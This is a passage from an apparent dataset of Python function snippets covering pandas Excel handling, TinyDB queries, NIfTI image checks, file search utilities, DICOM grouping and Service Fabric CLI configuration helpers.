            "def concat_sheets(xl_path: str, sheetnames=None, add_tab_names=False):\n    \"\"\" Return a pandas DataFrame with the concat'ed\n    content of the `sheetnames` from the Excel file in\n    `xl_path`.\n\n    Parameters\n    ----------\n    xl_path: str\n        Path to the Excel file\n\n    sheetnames: list of str\n        List of existing sheet names of `xl_path`.\n        If None, will use all sheets from `xl_path`.\n\n    add_tab_names: bool\n        If True will add a 'Tab' column which says from which\n        tab the row comes from.\n\n    Returns\n    -------\n    df: pandas.DataFrame\n    \"\"\"\n    xl_path, choice = _check_xl_path(xl_path)\n\n    if sheetnames is None:\n        sheetnames = get_sheet_list(xl_path)\n\n    sheets = pd.read_excel(xl_path, sheetname=sheetnames)\n\n    if add_tab_names:\n        for tab in sheets:\n            sheets[tab]['Tab'] = [tab] * len(sheets[tab])\n\n    return pd.concat([sheets[tab] for tab in sheets])"
        ],
        [
            "def _check_cols(df, col_names):\n    \"\"\" Raise an AttributeError if `df` does not have a column named as an item of\n    the list of strings `col_names`.\n    \"\"\"\n    for col in col_names:\n        if not hasattr(df, col):\n            raise AttributeError(\"DataFrame does not have a '{}' column, got {}.\".format(col,\n                                                                                         df.columns))"
        ],
        [
            "def col_values(df, col_name):\n    \"\"\" Return a list of not null values from the `col_name` column of `df`.\"\"\"\n    _check_cols(df, [col_name])\n\n    if 'O' in df[col_name] or pd.np.issubdtype(df[col_name].dtype, str): # if the column is of strings\n        return [nom.lower() for nom in df[pd.notnull(df)][col_name] if not pd.isnull(nom)]\n    else:\n        return [nom for nom in df[pd.notnull(df)][col_name] if not pd.isnull(nom)]"
        ],
        [
            "def duplicated_rows(df, col_name):\n    \"\"\" Return a DataFrame with the duplicated values of the column `col_name`\n    in `df`.\"\"\"\n    _check_cols(df, [col_name])\n\n    dups = df[pd.notnull(df[col_name]) & df.duplicated(subset=[col_name])]\n    return dups"
        ],
        [
            "def duplicated(values: Sequence):\n    \"\"\" Return the duplicated items in `values`\"\"\"\n    vals = pd.Series(values)\n    return vals[vals.duplicated()]"
        ],
        [
            "def _to_string(data):\n    \"\"\" Convert to string all values in `data`.\n\n    Parameters\n    ----------\n    data: dict[str]->object\n\n    Returns\n    -------\n    string_data: dict[str]->str\n    \"\"\"\n    sdata = data.copy()\n    for k, v in data.items():\n        if isinstance(v, datetime):\n            sdata[k] = timestamp_to_date_str(v)\n\n        elif not isinstance(v, (string_types, float, int)):\n            sdata[k] = str(v)\n\n    return sdata"
        ],
        [
            "def search_unique(table, sample, unique_fields=None):\n    \"\"\" Search for items in `table` that have the same field sub-set values as in `sample`.\n    Expecting it to be unique, otherwise will raise an exception.\n\n    Parameters\n    ----------\n    table: tinydb.table\n    sample: dict\n        Sample data\n\n    Returns\n    -------\n    search_result: tinydb.database.Element\n        Unique item result of the search.\n\n    Raises\n    ------\n    KeyError:\n        If the search returns for more than one entry.\n    \"\"\"\n    if unique_fields is None:\n        unique_fields = list(sample.keys())\n\n    query = _query_data(sample, field_names=unique_fields, operators='__eq__')\n    items = table.search(query)\n\n    if len(items) == 1:\n        return items[0]\n\n    if len(items) == 0:\n        return None\n\n    raise MoreThanOneItemError('Expected to find zero or one items, but found '\n                                '{} items.'.format(len(items)))"
        ],
        [
            "def find_unique(table, sample, unique_fields=None):\n    \"\"\"Search in `table` an item with the value of the `unique_fields` in the `sample` sample.\n    Check if the the obtained result is unique. If nothing is found will return an empty list,\n    if there is more than one item found, will raise an IndexError.\n\n    Parameters\n    ----------\n    table: tinydb.table\n\n    sample: dict\n        Sample data\n\n    unique_fields: list of str\n        Name of fields (keys) from `data` which are going to be used to build\n        a sample to look for exactly the same values in the database.\n        If None, will use every key in `data`.\n\n    Returns\n    -------\n    eid: int\n        Id of the object found with same `unique_fields`.\n        None if none is found.\n\n    Raises\n    ------\n    MoreThanOneItemError\n        If more than one example is found.\n    \"\"\"\n    res = search_unique(table, sample, unique_fields)\n    if res is not None:\n        return res.eid\n    else:\n        return res"
        ],
        [
            "def _query_sample(sample, operators='__eq__'):\n    \"\"\"Create a TinyDB query that looks for items that have each field in `sample` with a value\n    compared with the correspondent operation in `operators`.\n\n    Parameters\n    ----------\n    sample: dict\n        The sample data\n\n    operators: str or list of str\n        A list of comparison operations for each field value in `sample`.\n        If this is a str, will use the same operator for all `sample` fields.\n        If you want different operators for each field, remember to use an OrderedDict for `sample`.\n        Check TinyDB.Query class for possible choices.\n\n    Returns\n    -------\n    query: tinydb.database.Query\n    \"\"\"\n    if isinstance(operators, str):\n        operators = [operators] * len(sample)\n\n    if len(sample) != len(operators):\n        raise ValueError('Expected `operators` to be a string or a list with the same'\n                         ' length as `field_names` ({}), got {}.'.format(len(sample),\n                                                                         operators))\n\n    queries = []\n    for i, fn in enumerate(sample):\n        fv = sample[fn]\n        op = operators[i]\n        queries.append(_build_query(field_name=fn,\n                                    field_value=fv,\n                                    operator=op))\n\n    return _concat_queries(queries, operators='__and__')"
        ],
        [
            "def _query_data(data, field_names=None, operators='__eq__'):\n    \"\"\"Create a tinyDB Query object that looks for items that confirms the correspondent operator\n    from `operators` for each `field_names` field values from `data`.\n\n    Parameters\n    ----------\n    data: dict\n        The data sample\n\n    field_names: str or list of str\n        The name of the fields in `data` that will be used for the query.\n\n    operators: str or list of str\n        A list of comparison operations for each field value in `field_names`.\n        If this is a str, will use the same operator for all `field_names`.\n        If you want different operators for each field, remember to use an OrderedDict for `data`.\n        Check TinyDB.Query class for possible choices.\n\n    Returns\n    -------\n    query: tinydb.database.Query\n    \"\"\"\n    if field_names is None:\n        field_names = list(data.keys())\n\n    if isinstance(field_names, str):\n        field_names = [field_names]\n\n    # using OrderedDict by default, in case operators has different operators for each field.\n    sample = OrderedDict([(fn, data[fn]) for fn in field_names])\n    return _query_sample(sample, operators=operators)"
        ],
        [
            "def _concat_queries(queries, operators='__and__'):\n    \"\"\"Create a tinyDB Query object that is the concatenation of each query in `queries`.\n    The concatenation operator is taken from `operators`.\n\n    Parameters\n    ----------\n    queries: list of tinydb.Query\n        The list of tinydb.Query to be joined.\n\n    operators: str or list of str\n        List of binary operators to join `queries` into one query.\n        Check TinyDB.Query class for possible choices.\n\n    Returns\n    -------\n    query: tinydb.database.Query\n    \"\"\"\n    # checks first\n    if not queries:\n        raise ValueError('Expected some `queries`, got {}.'.format(queries))\n\n    if len(queries) == 1:\n        return queries[0]\n\n    if isinstance(operators, str):\n        operators = [operators] * (len(queries) - 1)\n\n    if len(queries) - 1 != len(operators):\n        raise ValueError('Expected `operators` to be a string or a list with the same'\n                         ' length as `field_names` ({}), got {}.'.format(len(queries),\n                                                                         operators))\n\n    # recursively build the query\n    first, rest, end = queries[0], queries[1:-1], queries[-1:][0]\n    bigop = getattr(first, operators[0])\n    for i, q in enumerate(rest):\n        bigop = getattr(bigop(q), operators[i])\n\n    return bigop(end)"
        ],
        [
            "def search_by_eid(self, table_name, eid):\n        \"\"\"Return the element in `table_name` with Object ID `eid`.\n        If None is found will raise a KeyError exception.\n\n        Parameters\n        ----------\n        table_name: str\n            The name of the table to look in.\n\n        eid: int\n            The Object ID of the element to look for.\n\n        Returns\n        -------\n        elem: tinydb.database.Element\n\n        Raises\n        ------\n        KeyError\n            If the element with ID `eid` is not found.\n        \"\"\"\n        elem = self.table(table_name).get(eid=eid)\n        if elem is None:\n            raise KeyError('Could not find {} with eid {}.'.format(table_name, eid))\n\n        return elem"
        ],
        [
            "def search_unique(self, table_name, sample, unique_fields=None):\n        \"\"\" Search in `table` an item with the value of the `unique_fields` in the `data` sample.\n        Check if the the obtained result is unique. If nothing is found will return an empty list,\n        if there is more than one item found, will raise an IndexError.\n\n        Parameters\n        ----------\n        table_name: str\n\n        sample: dict\n            Sample data\n\n        unique_fields: list of str\n            Name of fields (keys) from `data` which are going to be used to build\n            a sample to look for exactly the same values in the database.\n            If None, will use every key in `data`.\n\n        Returns\n        -------\n        eid: int\n            Id of the object found with same `unique_fields`.\n            None if none is found.\n\n        Raises\n        ------\n        MoreThanOneItemError\n            If more than one example is found.\n        \"\"\"\n        return search_unique(table=self.table(table_name),\n                             sample=sample,\n                             unique_fields=unique_fields)"
        ],
        [
            "def is_unique(self, table_name, sample, unique_fields=None):\n        \"\"\"Return True if an item with the value of `unique_fields`\n        from `data` is unique in the table with `table_name`.\n        False if no sample is found or more than one is found.\n\n        See function `find_unique` for more details.\n\n        Parameters\n        ----------\n        table_name: str\n\n        sample: dict\n            Sample data for query\n\n        unique_fields: str or list of str\n\n        Returns\n        -------\n        is_unique: bool\n        \"\"\"\n        try:\n            eid = find_unique(self.table(table_name),\n                              sample=sample,\n                              unique_fields=unique_fields)\n        except:\n            return False\n        else:\n            return eid is not None"
        ],
        [
            "def update_unique(self, table_name, fields, data, cond=None, unique_fields=None,\n                      *, raise_if_not_found=False):\n        \"\"\"Update the unique matching element to have a given set of fields.\n\n        Parameters\n        ----------\n        table_name: str\n\n        fields: dict or function[dict -> None]\n            new data/values to insert into the unique element\n            or a method that will update the elements.\n\n        data: dict\n            Sample data for query\n\n        cond: tinydb.Query\n            which elements to update\n\n        unique_fields: list of str\n\n        raise_if_not_found: bool\n            Will raise an exception if the element is not found for update.\n\n        Returns\n        -------\n        eid: int\n            The eid of the updated element if found, None otherwise.\n        \"\"\"\n        eid = find_unique(self.table(table_name), data, unique_fields)\n\n        if eid is None:\n            if raise_if_not_found:\n                msg  = 'Could not find {} with {}'.format(table_name, data)\n                if cond is not None:\n                    msg += ' where {}.'.format(cond)\n                raise IndexError(msg)\n\n        else:\n            self.table(table_name).update(_to_string(fields), cond=cond, eids=[eid])\n\n        return eid"
        ],
        [
            "def count(self, table_name, sample):\n        \"\"\"Return the number of items that match the `sample` field values\n        in table `table_name`.\n        Check function search_sample for more details.\n        \"\"\"\n        return len(list(search_sample(table=self.table(table_name),\n                                      sample=sample)))"
        ],
        [
            "def is_img(obj):\n    \"\"\" Check for get_data and get_affine method in an object\n\n    Parameters\n    ----------\n    obj: any object\n        Tested object\n\n    Returns\n    -------\n    is_img: boolean\n        True if get_data and get_affine methods are present and callable,\n        False otherwise.\n    \"\"\"\n    try:\n        get_data   = getattr(obj, 'get_data')\n        get_affine = getattr(obj, 'get_affine')\n\n        return isinstance(get_data,   collections.Callable) and \\\n               isinstance(get_affine, collections.Callable)\n    except AttributeError:\n        return False"
        ],
        [
            "def get_data(img):\n    \"\"\"Get the data in the image without having a side effect on the Nifti1Image object\n\n    Parameters\n    ----------\n    img: Nifti1Image\n\n    Returns\n    -------\n    np.ndarray\n    \"\"\"\n    if hasattr(img, '_data_cache') and img._data_cache is None:\n        # Copy locally the nifti_image to avoid the side effect of data\n        # loading\n        img = copy.deepcopy(img)\n    # force garbage collector\n    gc.collect()\n    return img.get_data()"
        ],
        [
            "def get_shape(img):\n    \"\"\"Return the shape of img.\n\n    Paramerers\n    -----------\n    img:\n\n    Returns\n    -------\n    shape: tuple\n    \"\"\"\n    if hasattr(img, 'shape'):\n        shape = img.shape\n    else:\n        shape = img.get_data().shape\n    return shape"
        ],
        [
            "def check_img_compatibility(one_img, another_img, only_check_3d=False):\n    \"\"\"Return true if one_img and another_img have the same shape.\n    False otherwise.\n    If both are nibabel.Nifti1Image will also check for affine matrices.\n\n    Parameters\n    ----------\n    one_img: nibabel.Nifti1Image or np.ndarray\n\n    another_img: nibabel.Nifti1Image  or np.ndarray\n\n    only_check_3d: bool\n        If True will check only the 3D part of the affine matrices when they have more dimensions.\n\n    Raises\n    ------\n    NiftiFilesNotCompatible\n    \"\"\"\n    nd_to_check = None\n    if only_check_3d:\n        nd_to_check = 3\n\n    if hasattr(one_img, 'shape') and hasattr(another_img, 'shape'):\n        if not have_same_shape(one_img, another_img, nd_to_check=nd_to_check):\n            msg = 'Shape of the first image: \\n{}\\n is different from second one: \\n{}'.format(one_img.shape,\n                                                                                               another_img.shape)\n            raise NiftiFilesNotCompatible(repr_imgs(one_img), repr_imgs(another_img), message=msg)\n\n    if hasattr(one_img, 'get_affine') and hasattr(another_img, 'get_affine'):\n        if not have_same_affine(one_img, another_img, only_check_3d=only_check_3d):\n            msg = 'Affine matrix of the first image: \\n{}\\n is different ' \\\n                  'from second one:\\n{}'.format(one_img.get_affine(), another_img.get_affine())\n            raise NiftiFilesNotCompatible(repr_imgs(one_img), repr_imgs(another_img), message=msg)"
        ],
        [
            "def have_same_affine(one_img, another_img, only_check_3d=False):\n    \"\"\"Return True if the affine matrix of one_img is close to the affine matrix of another_img.\n    False otherwise.\n\n    Parameters\n    ----------\n    one_img: nibabel.Nifti1Image\n\n    another_img: nibabel.Nifti1Image\n\n    only_check_3d: bool\n        If True will extract only the 3D part of the affine matrices when they have more dimensions.\n\n    Returns\n    -------\n    bool\n\n    Raises\n    ------\n    ValueError\n\n    \"\"\"\n    img1 = check_img(one_img)\n    img2 = check_img(another_img)\n\n    ndim1 = len(img1.shape)\n    ndim2 = len(img2.shape)\n\n    if ndim1 < 3:\n        raise ValueError('Image {} has only {} dimensions, at least 3 dimensions is expected.'.format(repr_imgs(img1), ndim1))\n\n    if ndim2 < 3:\n        raise ValueError('Image {} has only {} dimensions, at least 3 dimensions is expected.'.format(repr_imgs(img2), ndim1))\n\n    affine1 = img1.get_affine()\n    affine2 = img2.get_affine()\n    if only_check_3d:\n        affine1 = affine1[:3, :3]\n        affine2 = affine2[:3, :3]\n\n    try:\n        return np.allclose(affine1, affine2)\n    except ValueError:\n        return False\n    except:\n        raise"
        ],
        [
            "def repr_imgs(imgs):\n    \"\"\"Printing of img or imgs\"\"\"\n    if isinstance(imgs, string_types):\n        return imgs\n\n    if isinstance(imgs, collections.Iterable):\n        return '[{}]'.format(', '.join(repr_imgs(img) for img in imgs))\n\n    # try get_filename\n    try:\n        filename = imgs.get_filename()\n        if filename is not None:\n            img_str = \"{}('{}')\".format(imgs.__class__.__name__, filename)\n        else:\n            img_str = \"{}(shape={}, affine={})\".format(imgs.__class__.__name__,\n                                                       repr(get_shape(imgs)),\n                                                       repr(imgs.get_affine()))\n    except Exception as exc:\n        log.error('Error reading attributes from img.get_filename()')\n        return repr(imgs)\n    else:\n        return img_str"
        ],
        [
            "def have_same_shape(array1, array2, nd_to_check=None):\n    \"\"\"\n    Returns true if array1 and array2 have the same shapes, false\n    otherwise.\n\n    Parameters\n    ----------\n    array1: numpy.ndarray\n\n    array2: numpy.ndarray\n\n    nd_to_check: int\n        Number of the dimensions to check, i.e., if == 3 then will check only the 3 first numbers of array.shape.\n    Returns\n    -------\n    bool\n    \"\"\"\n    shape1 = array1.shape\n    shape2 = array2.shape\n    if nd_to_check is not None:\n        if len(shape1) < nd_to_check:\n            msg = 'Number of dimensions to check {} is out of bounds for the shape of the first image: \\n{}\\n.'.format(shape1)\n            raise ValueError(msg)\n        elif len(shape2) < nd_to_check:\n            msg = 'Number of dimensions to check {} is out of bounds for the shape of the second image: \\n{}\\n.'.format(shape2)\n            raise ValueError(msg)\n\n        shape1 = shape1[:nd_to_check]\n        shape2 = shape2[:nd_to_check]\n\n    return shape1 == shape2"
        ],
        [
            "def dir_match(regex, wd=os.curdir):\n    \"\"\"Create a list of regex matches that result from the match_regex\n    of all file names within wd.\n    The list of files will have wd as path prefix.\n\n    @param regex: string\n    @param wd: string\n    working directory\n    @return:\n    \"\"\"\n    ls = os.listdir(wd)\n\n    filt = re.compile(regex).match\n    return filter_list(ls, filt)"
        ],
        [
            "def recursive_dir_match(folder_path, regex=''):\n    \"\"\"\n    Returns absolute paths of folders that match the regex within folder_path and\n    all its children folders.\n\n    Note: The regex matching is done using the match function\n    of the re module.\n\n    Parameters\n    ----------\n    folder_path: string\n\n    regex: string\n\n    Returns\n    -------\n    A list of strings.\n    \"\"\"\n    outlist = []\n    for root, dirs, files in os.walk(folder_path):\n        outlist.extend([op.join(root, f) for f in dirs\n                        if re.match(regex, f)])\n\n    return outlist"
        ],
        [
            "def get_file_list(file_dir, regex=''):\n    \"\"\"\n    Creates a list of files that match the search_regex within file_dir.\n    The list of files will have file_dir as path prefix.\n\n    Parameters\n    ----------\n    @param file_dir:\n\n    @param search_regex:\n\n    Returns:\n    --------\n    List of paths to files that match the search_regex\n    \"\"\"\n    file_list = os.listdir(file_dir)\n    file_list.sort()\n\n    if regex:\n        file_list = search_list(file_list, regex)\n\n    file_list = [op.join(file_dir, fname) for fname in file_list]\n\n    return file_list"
        ],
        [
            "def recursive_find_search(folder_path, regex=''):\n    \"\"\"\n    Returns absolute paths of files that match the regex within file_dir and\n    all its children folders.\n\n    Note: The regex matching is done using the search function\n    of the re module.\n\n    Parameters\n    ----------\n    folder_path: string\n\n    regex: string\n\n    Returns\n    -------\n    A list of strings.\n\n    \"\"\"\n    outlist = []\n    for root, dirs, files in os.walk(folder_path):\n        outlist.extend([op.join(root, f) for f in files\n                        if re.search(regex, f)])\n\n    return outlist"
        ],
        [
            "def iter_recursive_find(folder_path, *regex):\n    \"\"\"\n    Returns absolute paths of files that match the regexs within folder_path and\n    all its children folders.\n\n    This is an iterator function that will use yield to return each set of\n    file_paths in one iteration.\n\n    Will only return value if all the strings in regex match a file name.\n\n    Note: The regex matching is done using the search function\n    of the re module.\n\n    Parameters\n    ----------\n    folder_path: string\n\n    regex: strings\n\n    Returns\n    -------\n    A list of strings.\n    \"\"\"\n    for root, dirs, files in os.walk(folder_path):\n        if len(files) > 0:\n            outlist = []\n            for f in files:\n                for reg in regex:\n                    if re.search(reg, f):\n                        outlist.append(op.join(root, f))\n            if len(outlist) == len(regex):\n                yield outlist"
        ],
        [
            "def get_all_files(folder):\n    \"\"\"\n    Generator that loops through all absolute paths of the files within folder\n\n    Parameters\n    ----------\n    folder: str\n    Root folder start point for recursive search.\n\n    Yields\n    ------\n    fpath: str\n    Absolute path of one file in the folders\n    \"\"\"\n    for path, dirlist, filelist in os.walk(folder):\n        for fn in filelist:\n            yield op.join(path, fn)"
        ],
        [
            "def recursive_glob(base_directory, regex=''):\n    \"\"\"\n    Uses glob to find all files or folders that match the regex\n    starting from the base_directory.\n\n    Parameters\n    ----------\n    base_directory: str\n\n    regex: str\n\n    Returns\n    -------\n    files: list\n\n    \"\"\"\n    files = glob(op.join(base_directory, regex))\n    for path, dirlist, filelist in os.walk(base_directory):\n        for dir_name in dirlist:\n            files.extend(glob(op.join(path, dir_name, regex)))\n\n    return files"
        ],
        [
            "def compose_err_msg(msg, **kwargs):\n    \"\"\"Append key-value pairs to msg, for display.\n\n    Parameters\n    ----------\n    msg: string\n        arbitrary message\n    kwargs: dict\n        arbitrary dictionary\n\n    Returns\n    -------\n    updated_msg: string\n        msg, with \"key: value\" appended. Only string values are appended.\n\n    Example\n    -------\n    >>> compose_err_msg('Error message with arguments...', arg_num=123, \\\n        arg_str='filename.nii', arg_bool=True)\n    'Error message with arguments...\\\\narg_str: filename.nii'\n    >>>\n    \"\"\"\n    updated_msg = msg\n    for k, v in sorted(kwargs.items()):\n        if isinstance(v, _basestring):  # print only str-like arguments\n            updated_msg += \"\\n\" + k + \": \" + v\n\n    return updated_msg"
        ],
        [
            "def group_dicom_files(dicom_file_paths, header_fields):\n    \"\"\"\n    Gets a list of DICOM file absolute paths and returns a list of lists of\n    DICOM file paths. Each group contains a set of DICOM files that have\n    exactly the same headers.\n\n    Parameters\n    ----------\n    dicom_file_paths: list of str\n        List or set of DICOM file paths\n\n    header_fields: list of str\n        List of header field names to check on the comparisons of the DICOM files.\n\n    Returns\n    -------\n    dict of DicomFileSets\n        The key is one filepath representing the group (the first found).\n    \"\"\"\n    dist = SimpleDicomFileDistance(field_weights=header_fields)\n\n    path_list = dicom_file_paths.copy()\n\n    path_groups = DefaultOrderedDict(DicomFileSet)\n\n    while len(path_list) > 0:\n        file_path1 = path_list.pop()\n        file_subgroup = [file_path1]\n\n        dist.set_dicom_file1(file_path1)\n        j = len(path_list)-1\n        while j >= 0:\n            file_path2 = path_list[j]\n            dist.set_dicom_file2(file_path2)\n\n            if dist.transform():\n                file_subgroup.append(file_path2)\n                path_list.pop(j)\n\n            j -= 1\n        path_groups[file_path1].from_set(file_subgroup, check_if_dicoms=False)\n\n    return path_groups"
        ],
        [
            "def copy_groups_to_folder(dicom_groups, folder_path, groupby_field_name):\n    \"\"\"Copy the DICOM file groups to folder_path. Each group will be copied into\n    a subfolder with named given by groupby_field.\n\n    Parameters\n    ----------\n    dicom_groups: boyle.dicom.sets.DicomFileSet\n\n    folder_path: str\n     Path to where copy the DICOM files.\n\n    groupby_field_name: str\n     DICOM field name. Will get the value of this field to name the group\n     folder.\n    \"\"\"\n    if dicom_groups is None or not dicom_groups:\n        raise ValueError('Expected a boyle.dicom.sets.DicomFileSet.')\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path, exist_ok=False)\n\n    for dcmg in dicom_groups:\n        if groupby_field_name is not None and len(groupby_field_name) > 0:\n            dfile = DicomFile(dcmg)\n            dir_name = ''\n            for att in groupby_field_name:\n                dir_name = os.path.join(dir_name, dfile.get_attributes(att))\n            dir_name = str(dir_name)\n        else:\n            dir_name = os.path.basename(dcmg)\n\n        group_folder = os.path.join(folder_path, dir_name)\n        os.makedirs(group_folder, exist_ok=False)\n\n        log.debug('Copying files to {}.'.format(group_folder))\n\n        import shutil\n        dcm_files = dicom_groups[dcmg]\n\n        for srcf in dcm_files:\n            destf = os.path.join(group_folder, os.path.basename(srcf))\n            while os.path.exists(destf):\n                destf += '+'\n            shutil.copy2(srcf, destf)"
        ],
        [
            "def calculate_file_distances(dicom_files, field_weights=None,\n                             dist_method_cls=None, **kwargs):\n    \"\"\"\n    Calculates the DicomFileDistance between all files in dicom_files, using an\n    weighted Levenshtein measure between all field names in field_weights and\n    their corresponding weights.\n\n    Parameters\n    ----------\n    dicom_files: iterable of str\n        Dicom file paths\n\n    field_weights: dict of str to float\n        A dict with header field names to float scalar values, that\n        indicate a distance measure ratio for the levenshtein distance\n        averaging of all the header field names in it. e.g., {'PatientID': 1}\n\n    dist_method_cls: DicomFileDistance class\n        Distance method object to compare the files.\n        If None, the default DicomFileDistance method using Levenshtein\n        distance between the field_wieghts will be used.\n\n    kwargs: DicomFileDistance instantiation named arguments\n        Apart from the field_weitghts argument.\n\n    Returns\n    -------\n    file_dists: np.ndarray or scipy.sparse.lil_matrix of shape NxN\n        Levenshtein distances between each of the N items in dicom_files.\n    \"\"\"\n    if dist_method_cls is None:\n        dist_method = LevenshteinDicomFileDistance(field_weights)\n    else:\n        try:\n            dist_method = dist_method_cls(field_weights=field_weights, **kwargs)\n        except:\n            log.exception('Could not instantiate {} object with field_weights '\n                          'and {}'.format(dist_method_cls, kwargs))\n\n    dist_dtype = np.float16\n    n_files = len(dicom_files)\n\n    try:\n        file_dists = np.zeros((n_files, n_files), dtype=dist_dtype)\n    except MemoryError as mee:\n        import scipy.sparse\n        file_dists = scipy.sparse.lil_matrix((n_files, n_files),\n                                             dtype=dist_dtype)\n\n    for idxi in range(n_files):\n        dist_method.set_dicom_file1(dicom_files[idxi])\n\n        for idxj in range(idxi+1, n_files):\n            dist_method.set_dicom_file2(dicom_files[idxj])\n\n            if idxi != idxj:\n                file_dists[idxi, idxj] = dist_method.transform()\n\n    return file_dists"
        ],
        [
            "def transform(self):\n        \"\"\"Check the field values in self.dcmf1 and self.dcmf2 and returns True\n        if all the field values are the same, False otherwise.\n\n        Returns\n        -------\n        bool\n        \"\"\"\n        if self.dcmf1 is None or self.dcmf2 is None:\n            return np.inf\n\n        for field_name in self.field_weights:\n            if (str(getattr(self.dcmf1, field_name, ''))\n                    != str(getattr(self.dcmf2, field_name, ''))):\n                return False\n\n        return True"
        ],
        [
            "def levenshtein_analysis(self, field_weights=None):\n        \"\"\"\n        Updates the status of the file clusters comparing the cluster\n        key files with a levenshtein weighted measure using either the\n        header_fields or self.header_fields.\n\n        Parameters\n        ----------\n        field_weights: dict of strings with floats\n            A dict with header field names to float scalar values, that indicate a distance measure\n            ratio for the levenshtein distance averaging of all the header field names in it.\n            e.g., {'PatientID': 1}\n        \"\"\"\n        if field_weights is None:\n            if not isinstance(self.field_weights, dict):\n                raise ValueError('Expected a dict for `field_weights` parameter, '\n                                 'got {}'.format(type(self.field_weights)))\n\n        key_dicoms = list(self.dicom_groups.keys())\n        file_dists = calculate_file_distances(key_dicoms, field_weights, self._dist_method_cls)\n        return file_dists"
        ],
        [
            "def dist_percentile_threshold(dist_matrix, perc_thr=0.05, k=1):\n        \"\"\"Thresholds a distance matrix and returns the result.\n\n        Parameters\n        ----------\n\n        dist_matrix: array_like\n        Input array or object that can be converted to an array.\n\n        perc_thr: float in range of [0,100]\n        Percentile to compute which must be between 0 and 100 inclusive.\n\n        k: int, optional\n        Diagonal above which to zero elements.\n        k = 0 (the default) is the main diagonal,\n        k < 0 is below it and k > 0 is above.\n\n        Returns\n        -------\n        array_like\n\n        \"\"\"\n        triu_idx = np.triu_indices(dist_matrix.shape[0], k=k)\n        upper = np.zeros_like(dist_matrix)\n        upper[triu_idx] = dist_matrix[triu_idx] < np.percentile(dist_matrix[triu_idx], perc_thr)\n        return upper"
        ],
        [
            "def get_groups_in_same_folder(self, folder_depth=3):\n        \"\"\"\n        Returns a list of 2-tuples with pairs of dicom groups that\n        are in the same folder within given depth.\n\n        Parameters\n        ----------\n        folder_depth: int\n        Path depth to check for folder equality.\n\n        Returns\n        -------\n        list of tuples of str\n        \"\"\"\n        group_pairs = []\n        key_dicoms = list(self.dicom_groups.keys())\n        idx = len(key_dicoms)\n        while idx > 0:\n            group1 = key_dicoms.pop()\n            dir_group1 = get_folder_subpath(group1, folder_depth)\n            for group in key_dicoms:\n                if group.startswith(dir_group1):\n                    group_pairs.append((group1, group))\n            idx -= 1\n\n        return group_pairs"
        ],
        [
            "def merge_groups(self, indices):\n        \"\"\"Extend the lists within the DICOM groups dictionary.\n        The indices will indicate which list have to be extended by which\n        other list.\n\n        Parameters\n        ----------\n        indices: list or tuple of 2 iterables of int, bot having the same len\n             The indices of the lists that have to be merged, both iterables\n             items will be read pair by pair, the first is the index to the\n             list that will be extended with the list of the second index.\n             The indices can be constructed with Numpy e.g.,\n             indices = np.where(square_matrix)\n        \"\"\"\n        try:\n            merged = merge_dict_of_lists(self.dicom_groups, indices,\n                                         pop_later=True, copy=True)\n            self.dicom_groups = merged\n        except IndexError:\n            raise IndexError('Index out of range to merge DICOM groups.')"
        ],
        [
            "def move_to_folder(self, folder_path, groupby_field_name=None):\n        \"\"\"Copy the file groups to folder_path. Each group will be copied into\n        a subfolder with named given by groupby_field.\n\n        Parameters\n        ----------\n        folder_path: str\n         Path to where copy the DICOM files.\n\n        groupby_field_name: str\n         DICOM field name. Will get the value of this field to name the group\n         folder. If empty or None will use the basename of the group key file.\n        \"\"\"\n        try:\n            copy_groups_to_folder(self.dicom_groups, folder_path, groupby_field_name)\n        except IOError as ioe:\n            raise IOError('Error moving dicom groups to {}.'.format(folder_path)) from ioe"
        ],
        [
            "def get_unique_field_values_per_group(self, field_name,\n                                          field_to_use_as_key=None):\n        \"\"\"Return a dictionary where the key is the group key file path and\n        the values are sets of unique values of the field name of all DICOM\n        files in the group.\n\n        Parameters\n        ----------\n        field_name: str\n         Name of the field to read from all files\n\n        field_to_use_as_key: str\n         Name of the field to get the value and use as key.\n         If None, will use the same key as the dicom_groups.\n\n        Returns\n        -------\n        Dict of sets\n        \"\"\"\n        unique_vals = DefaultOrderedDict(set)\n        for dcmg in self.dicom_groups:\n            for f in self.dicom_groups[dcmg]:\n                field_val = DicomFile(f).get_attributes(field_name)\n                key_val = dcmg\n                if field_to_use_as_key is not None:\n                    try:\n                        key_val = str(DicomFile(dcmg).get_attributes(field_to_use_as_key))\n                    except KeyError as ke:\n                        raise KeyError('Error getting field {} from '\n                                      'file {}'.format(field_to_use_as_key,\n                                                       dcmg)) from ke\n                unique_vals[key_val].add(field_val)\n\n        return unique_vals"
        ],
        [
            "def get_config_value(name, fallback=None):\n    \"\"\"Gets a config by name.\n\n    In the case where the config name is not found, will use fallback value.\"\"\"\n\n    cli_config = CLIConfig(SF_CLI_CONFIG_DIR, SF_CLI_ENV_VAR_PREFIX)\n\n    return cli_config.get('servicefabric', name, fallback)"
        ],
        [
            "def get_config_bool(name):\n    \"\"\"Checks if a config value is set to a valid bool value.\"\"\"\n\n    cli_config = CLIConfig(SF_CLI_CONFIG_DIR, SF_CLI_ENV_VAR_PREFIX)\n    return cli_config.getboolean('servicefabric', name, False)"
        ],
        [
            "def set_config_value(name, value):\n    \"\"\"Set a config by name to a value.\"\"\"\n\n    cli_config = CLIConfig(SF_CLI_CONFIG_DIR, SF_CLI_ENV_VAR_PREFIX)\n    cli_config.set_value('servicefabric', name, value)"
        ],
        [
            "def cert_info():\n    \"\"\"Path to certificate related files, either a single file path or a\n    tuple. In the case of no security, returns None.\"\"\"\n\n    sec_type = security_type()\n    if sec_type == 'pem':\n        return get_config_value('pem_path', fallback=None)\n    if sec_type == 'cert':\n        cert_path = get_config_value('cert_path', fallback=None)\n        key_path = get_config_value('key_path', fallback=None)\n        return cert_path, key_path\n\n    return None"
        ],
        [
            "def set_aad_cache(token, cache):\n    \"\"\"Set AAD token cache.\"\"\"\n    set_config_value('aad_token', jsonpickle.encode(token))\n    set_config_value('aad_cache', jsonpickle.encode(cache))"
        ],
        [
            "def set_aad_metadata(uri, resource, client):\n    \"\"\"Set AAD metadata.\"\"\"\n    set_config_value('authority_uri', uri)\n    set_config_value('aad_resource', resource)\n    set_config_value('aad_client', client)"
        ],
        [
